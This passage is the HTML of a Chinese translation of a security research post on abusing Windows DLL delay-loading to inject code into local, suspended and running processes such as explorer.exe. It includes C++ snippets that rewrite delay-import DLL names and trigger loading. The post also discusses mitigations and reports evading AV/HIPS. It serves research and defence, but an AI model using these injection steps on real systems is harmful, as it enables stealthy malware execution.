+74630000&nbsp;746e2000&nbsp;&nbsp;&nbsp;DUI70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(pdb&nbsp;symbols)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">从上面可以看到，这里只是解析了了四个函数中的两个，并将DUI70.dll库加载到了该进程中。在延迟加载描述符的每个条目中，被引用的结构都会为HMODULE维护一个RVA。 如果模块未加载，它将为空。 所以，当调用已经加载的延迟函数时，延迟助手函数将检查它的条目以确定是否可以使用它的句柄：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">HMODULE&nbsp;hmod&nbsp;=&nbsp;*idd.phmod;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(hmod&nbsp;==&nbsp;0)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__pfnDliNotifyHook2)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hmod&nbsp;=&nbsp;HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary,&nbsp;&amp;dli)));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(hmod&nbsp;==&nbsp;0)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hmod&nbsp;=&nbsp;::LoadLibraryEx(dli.szDll,&nbsp;NULL,&nbsp;0);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">idd结构只是上述InternalImgDelayDescr的一个实例，它将会从链接器tailMerge存根传递给__delayLoadHelper2函数。因此，如果该模块已经被加载，当从延迟条目引用时，它将使用该句柄。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里另一个注意事项是，延迟加载器支持通知钩子。有六个状态可以供我们挂钩：进程启动，预加载库，加载库出错，预取GetProcAddress，GetProcAddress失败和结束进程。你可以在上面的代码示例中看到钩子的具体用法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，除了延迟加载外，PE文件还支持库的延迟卸载。当然，了解了库的延迟加载后，库的延迟卸载就不用多说了。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">DLL延迟加载技术的局限性</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在详细说明我们如何利用DLL延迟加载之前，我们首先来了解一下这种技术的局限性。它不是完全可移植的，并且单纯使用延迟加载功能无法实现我们的目的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">它最明显的局限性在于，该技术要求远程进程被延迟链接。我在自己的主机上简单抓取一些本地进程，它们大部分都是一些Microsoft应用程序：dwm，explorer，cmd。许多非Microsoft应用程序也是如此，包括Chrome。 此外，由于PE格式受到了广泛的支持，所以在许多现代系统上都能见到它的身影。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">另一个限制，是它依赖于LoadLibrary，也就是说磁盘上必须存在一个DLL。我们没有办法从内存中使用LoadLibrary。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">除了实现延迟加载外，远程进程必须实现可以触发的功能。我们需要获取伪IAT，而不是执行CreateRemoteThread、SendNotifyMessage或ResumeThread，因此我们必须能够触发远程进程来执行该操作/执行该功能。如果您使用挂起进程/新建进程策略，虽然这本身并不难，但运行应用程序可能并不容易。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，任何不允许加载无符号库的进程都能阻止这种技术。这种特性是由ProcessSignaturePolicy控制的，可以使用SetProcessMitigationPolicy [2]进行相应设置；目前还不清楚有多少应用程序正在使用这些应用程序，但是Microsoft Edge是第一个采用该策略的大型产品之一。此外， 该技术也受到ProcessImageLoadPolicy策略的影响，该策略可以设置为限制从UNC共享加载图像。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用方法</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当讨论将代码注入到进程中的能力时，攻击者可能会想到三种不同的情形，以及远程进程中的一些额外的情况。本地进程注入只是在当前进程中执行shellcode /任意代码。挂起的进程是从现有的受控的进程中产生一个新的挂起的进程，并将代码注入其中。这是一个相当普遍的策略，可以在注入之前迁移代码，建立备份连接或创建已知的进程状态。最后一种情形是运行远程进程。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行远程进程是一个有趣的情况，我们将在下面探讨其中的几个注意事项。我不会详细介绍挂起的进程，因为它与利用运行的进程的方法基本相同，并且更容易。之所以很容易，因为许多应用程序实际上只在运行时加载延迟库，或者由于该功能是环境所需，或者因为需要链接另一个加载的DLL。这方面的源代码实现请参考文献[3]。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本地进程</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本地进程是这个策略中最简单和最有用的一种方式。 如果我们能够以这种方式来注入和执行代码的话，我们也可以链接到我们想要使用的库。我们需要做的第一件事是延迟链接可执行文件。由于某些原因，我最初选择了dnsapi.dll。 您可以通过Visual Studio的链接器选项来指定延迟加载DLL。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因此，我们需要获取延迟目录的RVA，这可以通过以下函数来完成：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">IMAGE_DELAYLOAD_DESCRIPTOR*
+findDelayEntry(char&nbsp;*cDllName)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;PIMAGE_DOS_HEADER&nbsp;pImgDos&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;PIMAGE_NT_HEADERS&nbsp;pImgNt&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((LPBYTE)pImgDos&nbsp;+&nbsp;pImgDos-&gt;e_lfanew);
+&nbsp;&nbsp;&nbsp;&nbsp;PIMAGE_DELAYLOAD_DESCRIPTOR&nbsp;pImgDelay&nbsp;=&nbsp;(PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos&nbsp;+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
+&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;dwBaseAddr&nbsp;=&nbsp;(DWORD)GetModuleHandle(NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_DELAYLOAD_DESCRIPTOR&nbsp;*pImgResult&nbsp;=&nbsp;NULL;
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;iterate&nbsp;over&nbsp;entries&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(IMAGE_DELAYLOAD_DESCRIPTOR*&nbsp;entry&nbsp;=&nbsp;pImgDelay;&nbsp;entry-&gt;ImportAddressTableRVA&nbsp;!=&nbsp;NULL;&nbsp;entry++){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*_cDllName&nbsp;=&nbsp;(char*)(dwBaseAddr&nbsp;+&nbsp;entry-&gt;DllNameRVA);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(_cDllName,&nbsp;cDllName)&nbsp;==&nbsp;0){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pImgResult&nbsp;=&nbsp;entry;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;pImgResult;
+}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">得到了相应的表项后，我们需要将条目的DllName标记为可写，用我们的自定义DLL名称覆盖它，并恢复保护掩码：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">IMAGE_DELAYLOAD_DESCRIPTOR&nbsp;*pImgDelayEntry&nbsp;=&nbsp;findDelayEntry(&quot;DNSAPI.dll&quot;);
+DWORD&nbsp;dwEntryAddr&nbsp;=&nbsp;(DWORD)((DWORD)GetModuleHandle(NULL)&nbsp;+&nbsp;pImgDelayEntry-&gt;DllNameRVA);
+VirtualProtect((LPVOID)dwEntryAddr,&nbsp;sizeof(DWORD),&nbsp;PAGE_READWRITE,&nbsp;&amp;dwOldProtect);
+WriteProcessMemory(GetCurrentProcess(),&nbsp;(LPVOID)dwEntryAddr,&nbsp;(LPVOID)ndll,&nbsp;strlen(ndll),&nbsp;&amp;wroteBytes);
+VirtualProtect((LPVOID)dwEntryAddr,&nbsp;sizeof(DWORD),&nbsp;dwOldProtect,&nbsp;&amp;dwOldProtect);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在要做的就是触发目标函数。一旦触发，延迟助手函数将从表条目中阻断DllName，并通过LoadLibrary加载DLL。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">远程进程</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最有趣的方法是运行远程进程。我们将通过explorer.exe进行演示，因为它最为常见。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了打开资源管理器进程的句柄，我们必须执行与本地进程相同的搜索任务，但这一次是在远程进程中进行的。虽然这有点麻烦，但相关的代码可以从文献[3]的项目库中找到。实际上，我们只需抓取远程PEB，解析图像及其目录，并找到我们所感兴趣的延迟条目即可。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当尝试将其移植到另一个进程时，这部分可能是最不友好的；我们的目标是什么？哪个函数或延迟加载条目通常不会被使用，并且可从当前会话触发？对于资源管理器来说，有多个选择；它延迟链接到9个不同的DLL，每个平均有2-3个导入函数。幸运的是，我看到的第一个函数是非常简单：CM_Request_Eject_PC。该函数是由CFGMGR32.dll导出的，作用是请求系统从本地坞站[4]弹出。因此，我们可以假设在用户从未明确要求系统弹出的情况下，它在工作站上是可用的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当我们要求工作站从坞站弹出时，该函数发送PNP请求。我们使用IShellDispatch对象来执行该操作，该对象可以通过Shell访问，然后交由资源管理器进行处理。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个代码其实很简单：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">HRESULT&nbsp;hResult&nbsp;=&nbsp;S_FALSE;
+IShellDispatch&nbsp;*pIShellDispatch&nbsp;=&nbsp;NULL;
+CoInitialize(NULL);
+hResult&nbsp;=&nbsp;CoCreateInstance(CLSID_Shell,&nbsp;NULL,&nbsp;CLSCTX_INPROC_SERVER,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IID_IShellDispatch,&nbsp;(void**)&amp;pIShellDispatch);
+if&nbsp;(SUCCEEDED(hResult))
+{
+&nbsp;&nbsp;&nbsp;&nbsp;pIShellDispatch-&gt;EjectPC();
+&nbsp;&nbsp;&nbsp;&nbsp;pIShellDispatch-&gt;Release();
+}
+CoUninitialize();</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们的DLL只需要导出CM_Request_Eject_PC，这不会导致进程崩溃；我们可以将请求传递给真正的DLL，也可以忽略它。所以，我们就能稳定可靠完成远程代码注入了。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">远程进程</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一个有趣的情况是要注入的远程进程需延迟加载，但所有导入的函数都已在伪IAT中完成解析了。这就有点复杂了，但也不是完全没有希望。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还记得前面提到的延迟加载库的句柄是否保留在其描述符中吗？帮助函数就是通过检查这个值以确定是否应该重新加载模块的；如果其值为null，就会尝试加载模块，如果不是，它就使用该句柄。我们可以通过清空模块句柄来滥用该检查，从而&quot;欺骗&quot;助手函数，让它重新加载该描述符的DLL。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然而，对于讨论的这种情况来说，伪IAT已经被完全修复了；所以无法将更多的“跳板”可以放入延迟加载帮助函数。 在默认情况下，伪IAT是可写的，所以我们可以直接修改跳板函数，并用它来重新实例化描述符。 简而言之，这种最坏情况下的策略需要三个独立的WriteProcessMemory调用：一个用于清除模块句柄，一个用于覆盖伪IAT条目，一个用于覆盖加载的DLL名称。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">结束语</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前面说过，我曾经针对下一代AV/HIPS（具体名称这里就不说了）测试过这个策略，它们没有一个能够检测到交叉进程注入策略。针对这种策略的检测看上去是一个有趣的挑战；在远程进程中，策略使用以下调用链：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">OpenProcess(..);
+ReadRemoteProcess(..);&nbsp;//&nbsp;read&nbsp;image
+ReadRemoteProcess(..);&nbsp;//&nbsp;read&nbsp;delay&nbsp;table&nbsp;
+ReadRemoteProcess(..);&nbsp;//&nbsp;read&nbsp;delay&nbsp;entry&nbsp;1...n
+VirtualProtectEx(..);
+WriteRemoteProcess(..);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">触发功能在每个进程之间都是动态的，所有加载的库都是通过一些大家熟知的Windows设备来加载。此外，我还检查了其他一些核心的Windows应用程序，它们都有非常简单的触发策略。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">引用的文献[3]提供了对于x86和x64系统的支持，并已在Windows 7,8.1和10中通过了测试。它涉及三个函数：inject_local，inject_suspended和inject_explorer。它通过会到C：\ Windows \ Temp \ TestDLL.dll查找该DLL，但这显然是可以更改的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">特别感谢Stephen Breen审阅了这篇文章。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考文献</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">[0] <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[2] <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088(v=vs.85).aspx</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[4] <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811(v=vs.85).aspx</a>&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/" target="_blank">原文链接：http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】利用DLL延迟加载实现远程代码注入  - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4463" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="3c0510d3b39fbf99cfcb4ef0ba2556be">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4467.html" alt="【漏洞预警】SambaBleed：Samba信息泄露漏洞（CVE–2017–12163）预警" target="_blank">【漏洞预警】SambaBleed：Sa...</a></li>
+                                <li><a href="/learning/detail/4456.html" alt="【木马分析】Chrome插件：User–Agent Switcher恶意代码分析报告" target="_blank">【木马分析】Chrome插件：User...</a></li>
+                                <li><a href="/learning/detail/4442.html" alt="【知识】9月19日 - 每日安全知识热点" target="_blank">【知识】9月19日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4448.html" alt="【木马分析】供应链幽灵再现：CCleaner软件攻击分析报告" target="_blank">【木马分析】供应链幽灵再现：CCl...</a></li>
+                                <li><a href="/learning/detail/4469.html" alt="【知识】9月24日 - 每日安全知识热点" target="_blank">【知识】9月24日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4453.html" alt="【技术分享】Is Hajime botnet dead?" target="_blank">【技术分享】Is Hajime bot...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
